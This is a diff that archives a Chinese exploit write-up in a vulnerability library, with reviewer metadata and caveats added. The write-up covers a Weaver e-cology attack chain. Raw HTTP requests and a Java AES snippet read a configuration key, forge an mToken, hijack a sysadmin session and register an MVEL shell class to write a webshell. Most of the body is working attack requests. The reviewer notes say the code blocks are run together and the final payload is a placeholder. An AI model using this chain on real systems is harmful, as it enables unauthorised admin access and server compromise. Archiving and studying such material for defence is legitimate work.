@@ -1,8 +1,49 @@
 ---
 source: "gelusus/wxvl 公众号漏洞文库"
+title: "泛微e-cology DWR配置密钥读取→mToken登录绕过→后台加密类MVEL执行链"
+product: "泛微e-cology"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "无产品/补丁版本；需mobilemode配置、管理接口和MVEL类"
+prerequisites: "前台链取得sysadmin会话，RCE步骤需后台会话"
+side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态"
+review_date: "2026-10-02"
+source_status: "unknown"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/0day%20%E6%B3%9B%E5%BE%AEOA%E5%89%8D%E5%8F%B0%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%2B%E5%90%8E%E5%8F%B0%E7%BB%84%E5%90%88%E6%8B%B3RCE.md"
+id: "vw-b9ca61266cf361d03507570c"
+entity_id: "ve-b9ca61266cf361d03507570c"
+schema_version: "1"
 ---
 
-#  【0day】泛微OA前台登录绕过+后台组合拳RCE  
+# 泛微e-cology DWR配置密钥读取→mToken登录绕过→后台加密类MVEL执行链
+
+## 条目说明
+
+- 对象与具体问题：泛微e-cology；DWR配置密钥读取→mToken登录绕过→后台加密类MVEL执行链
+- 版本、配置及部署条件：无产品/补丁版本；需mobilemode配置、管理接口和MVEL类
+- 认证与权限前提：前台链取得sysadmin会话，RCE步骤需后台会话
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 几乎全部HTTP/Java块换行丢失粘连，publicclass错误且multipart boundary前后不一致
+- 最终plaintext只写马子，核心执行内容缺失，不能作为完整RCE复现
+- 密钥/mToken/sessionKey为环境实例且时间戳需更新；原文链接未真实提供
+- 0day需保留为2025-07-01历史标题标签而非当前状态
+
+## 操作风险
+
+文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 原创 XingYue404  星悦安全   2025-07-01 11:38  
   
 ![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
@@ -11,10 +52,10 @@ source: "gelusus/wxvl 公众号漏洞文库"
 蓝字  
 关注我们 并设为  
 星标  
-## 0x01 登录绕过  
-### 利用/dwr/call接口读取加密key  
+### 0x01 登录绕过  
+#### 利用/dwr/call接口读取加密key  
   
-```
+```http
 POST /dwr/call/plaincall/?callCount=1&c0-id=1&c0-scriptName=WorkflowSubwfSetUtil&c0-methodName=LoadTemplateProp&batchId=a&c0-param0=string:mobilemode&scriptSessionId=1&a=.swf HTTP/1.1Host: xxx:xxxxUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1
 ```  
   
@@ -22,7 +63,7 @@ POST /dwr/call/plaincall/?callCount=1&c0-id=1&c0-scriptName=WorkflowSubwfSetUtil
 ![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5ceGLwibV7eibnrbLN1s9VOtTUMFUFw5wm7jEQPWogeciaf1KLHCTIGRUiaAeyDOQmIhQIrqMQ5JjyZ0A/640?wx_fmt=other&from=appmsg "")  
   
 其中security.key为 5f2f28dd-db4a-45  
-### 调用aes加密函数  
+#### 调用aes加密函数  
   
 ```
 import java.security.SecureRandom;import javax.crypto.Cipher;import javax.crypto.KeyGenerator;import javax.crypto.spec.SecretKeySpec;import javax.xml.bind.DatatypeConverter;publicclass Main {    public static String encrypt(String str, String str2) {        try {            KeyGenerator keyGenerator = KeyGenerator.getInstance("AES");            SecureRandom secureRandom = SecureRandom.getInstance("SHA1PRNG");            secureRandom.setSeed(str2.getBytes());            keyGenerator.init(128, secureRandom);            SecretKeySpec secretKeySpec = new SecretKeySpec(keyGenerator.generateKey().getEncoded(), "AES");            Cipher cipher = Cipher.getInstance("AES");            cipher.init(1, secretKeySpec);            return DatatypeConverter.printHexBinary(cipher.doFinal(str.getBytes()));        } catch (Exception e) {            e.printStackTrace();            return"";        }    }    public static void main(String[] args) {        System.out.println(encrypt("1;1;"+System.currentTimeMillis(),"5f2f28dd-db4a-45"));    }}
@@ -33,52 +74,52 @@ import java.security.SecureRandom;import javax.crypto.Cipher;import javax.crypto
   
 获取到密钥，即为下面需要用到的mToken  
   
-### 获取sessionKey  
+#### 获取sessionKey  
   
-```
+```http
 GET /mobilemode/mobile/server.jsp?invoker=com.api.mobilemode.web.mobile.service.MobileEntranceAction&action=meta&appid=1&appHomepageId=1&mTokenFrom=QRCode&mToken=BAAD7750912407C15FBC7CA2BDA4BDDDAEACE215E26BB871CE8D171028A66A70&_ec_ismobile=true&timeZoneOffset=&a=.swf HTTP/1.1Host: xxxx:xxxxUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1
 ```  
   
-###   
+####   
   
 获取到sysadmin 的sessionKey  
-### 登录后台  
+#### 登录后台  
   
 将sessionKey转换为ecology_JSessionid即可登录后台  
   
-```
-GET /weaver/ImgFileDownload/a.swf?sessionkey=b20e3665-d8a8-403d-a041-0c5883626da4&a=.swf HTTP/1.1Host: xxxx:xxxxUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1
+```http
+GET /weaver/ImgFileDownload/a.swf?sessionkey=b**********************************4&a=.swf HTTP/1.1Host: xxxx:xxxxUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1
 ```  
   
-###   
-###   
-## 0x02 后台RCE  
-### 添加方法  
+####   
+####   
+### 0x02 后台RCE  
+#### 添加方法  
   
-```
+```http
 POST /interface/outter/outter_encryptclassOperation.jsp?a=1.swf HTTP/1.1Host: xxxx:xxxIf-None-Match: "6evu6PUo/Cz"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateIf-Modified-Since: Thu, 23 Jun 2022 11:04:04 GMTContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryVnIIuCache-Control: max-age=0Upgrade-Insecure-Requests: 1Accept-Language: zh-CN,zh;q=0.9Cookie: ecology_JSessionid=aaa_db33mBm_EaOGEO8bz; __randcode__=b7e3d245-5b6b-44ba-b06b-f4b5592d68dc------WebKitFormBoundaryVnIIugCdViAmEyK3Content-Disposition: form-data; name="operation"add------WebKitFormBoundaryVnIIugCdViAmEyK3Content-Disposition: form-data; name="encryptname"ttttaaa------WebKitFormBoundaryVnIIugCdViAmEyK3Content-Disposition: form-data; name="encryptclass"org.mvel2.sh.ShellSession------WebKitFormBoundaryVnIIugCdViAmEyK3Content-Disposition: form-data; name="encryptmethod"exec------WebKitFormBoundaryVnIIugCdViAmEyK3Content-Disposition: form-data; name="decryptmethod"exec------WebKitFormBoundaryVnIIugCdViAmEyK3Content-Disposition: form-data; name="isdialog"0------WebKitFormBoundaryVnIIugCdViAmEyK3Content-Disposition: form-data; name="x"; filename="x"x------WebKitFormBoundaryVnIIugCdViAmEyK3--
 ```  
   
-###   
-### 查看添加的ID  
+####   
+#### 查看添加的ID  
   
-```
+```http
 POST /api/integration/Outter/getOutterSysEncryptClassOperates?a=1.swf HTTP/1.1Host: xxxx:xxxIf-None-Match: "6evu6PUo/Cz"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateIf-Modified-Since: Thu, 23 Jun 2022 11:04:04 GMTContent-Type: application/x-www-form-urlencodedCache-Control: max-age=0Upgrade-Insecure-Requests: 1Accept-Language: zh-CN,zh;q=0.9Cookie: ecology_JSessionid=aaa_db33mBm_EaOGEO8bz; __randcode__=b7e3d245-5b6b-44ba-b06b-f4b5592d68dc
 ```  
   
-###   
+####   
   
 此处ID为2  
-### 直接执行java代码写shell  
+#### 直接执行java代码写shell  
   
-```
+```http
 POST /interface/outter/outter_encryptclassOperation.jsp?a=1.swf HTTP/1.1Host: xxxx:xxxIf-None-Match: "6evu6PUo/Cz"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateIf-Modified-Since: Thu, 23 Jun 2022 11:04:04 GMTContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryITdrxCache-Control: max-age=0Upgrade-Insecure-Requests: 1Accept-Language: zh-CN,zh;q=0.9Cookie: ecology_JSessionid=aaa_db33mBm_EaOGEO8bz; __randcode__=b7e3d245-5b6b-44ba-b06b-f4b5592d68dc------WebKitFormBoundaryITdrxxca8L1Xo7RqContent-Disposition: form-data; name="operation"test------WebKitFormBoundaryITdrxxca8L1Xo7RqContent-Disposition: form-data; name="plaintext"马子------WebKitFormBoundaryITdrxxca8L1Xo7RqContent-Disposition: form-data; name="id"2------WebKitFormBoundaryITdrxxca8L1Xo7RqContent-Disposition: form-data; name="x"; filename="x"1------WebKitFormBoundaryITdrxxca8L1Xo7Rq--
 ```  
   
-###   
+####   
   
 写入进 /getaddr.jsp  
-## 0x03 关注公众号  
+### 0x03 关注公众号  
   
 **标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，交易所**  
   
